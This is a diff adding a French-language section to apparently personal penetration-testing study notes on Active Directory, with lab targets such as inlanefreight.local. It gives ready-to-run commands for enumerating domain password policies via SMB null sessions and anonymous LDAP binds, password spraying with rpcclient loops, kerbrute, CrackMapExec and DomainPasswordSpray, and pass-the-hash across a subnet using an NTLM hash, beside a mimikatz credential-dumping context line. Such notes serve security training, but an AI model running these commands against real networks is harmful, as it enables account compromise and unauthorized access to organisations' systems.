@@ -258,3 +258,108 @@ sekurlsa::logonpasswords
 privilege::debug 
 
 ```
+
+
+
+## Énumération & Récupération des politiques de mots de passe
+### Énumération de la politique de mots de passe - depuis Linux 
+
+nous pouvons extraire la politique de mots de passe du domaine de plusieurs manières, selon la configuration du domaine et si nous disposons ou non d'identifiants de domaine valides
+
+```
+crackmapexec smb IP -u username -p Password --pass-pol
+```
+
+### Énumération de la politique de mots de passe - depuis Linux - Sessions nulles SMB
+
+Sans identifiants, nous pouvons être en mesure d'obtenir la politique de mots de passe via une session nulle SMB (SMB NULL session) ou une liaison anonyme LDAP (LDAP anonymous bind). 
+
+#### Verification de la session Null SMB
+
+Pour l'énumération, nous pouvons utiliser des outils tels que enum4linux, CrackMapExec, rpcclient, etc.
+
+Nous pouvons utiliser rpcclient pour vérifier l'accès à une session nulle SMB sur un contrôleur de domaine.
+
+```
+rpcclient -U "" -N IP
+```
+
+Une fois connecté, nous pouvons lancer une commande RPC telle que querydominfo pour obtenir des informations sur le domaine et confirmer l'accès par session nulle.
+
+```
+rpcclient $> querydominfo
+```
+
+Nous pouvons également obtenir la politique de mots de passe.
+
+```
+rpcclient $> getdompwinfo
+```
+
+l est moins courant de réaliser ce type d'attaque par session nulle depuis Windows, mais nous pourrions utiliser la commande
+
+```
+net use \\host\ipc$ "" /u:""
+```
+
+
+### Énumération de la politique de mots de passe - depuis Linux - Liaison anonyme LDAP
+
+Les liaisons anonymes LDAP permettent aux attaquants non authentifiés de récupérer des informations sur le domaine, telles qu'une liste complète des utilisateurs, des groupes, des ordinateurs, des attributs de comptes utilisateurs et la politique de mots de passe du domaine.
+Avec une liaison anonyme LDAP, nous pouvons utiliser des outils d'énumération spécifiques à LDAP tels que windapsearch.py, ldapsearch, ad-ldapdomaindump.py, etc., pour extraire la politique de mots de passe. 
+
+```
+ ldapsearch -h 172.16.5.5 -x -b 
+```
+
+Si nous pouvons nous authentifier sur le domaine depuis un hôte Windows, nous pouvons utiliser des binaires Windows intégrés tels que net.exe pour récupérer la politique de mots de passe. 
+
+```
+net accounts
+```
+
+
+Utilisation de PowerView
+
+```
+ import-module .\PowerView.ps1
+ Get-DomainPolicy
+```
+
+
+### Pulvérisation de mots de passe interne depuis un hôte Linux
+
+Une fois que nous avons créé une liste de mots en utilisant l'une des méthodes présentées dans la section précédente, il est temps d'exécuter l'attaque.
+
+Utiliser une commande Bash sur une seule ligne pour l'attaque
+
+```
+for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
+```
+
+Nous pouvons également utiliser Kerbrutepour la même attaque
+
+```
+kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1
+```
+
+
+Il existe de nombreuses autres méthodes pour effectuer une pulvérisation de mots de passe depuis Linux. Une autre excellente option est d'utiliser CrackMapExec
+
+```
+sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
+```
+
+```
+sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
+```
+
+### Utilisation de DomainPasswordSpray.ps1
+
+'outil DomainPasswordSpray est très efficace. Si nous sommes authentifiés sur le domaine, l'outil générera automatiquement une liste d'utilisateurs à partir d'Active Directory, interrogera la politique de mot de passe du domaine et exclura les comptes utilisateurs à une tentative près du verrouillage.
+
+
+```
+ Import-Module .\DomainPasswordSpray.ps1
+ Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
+```
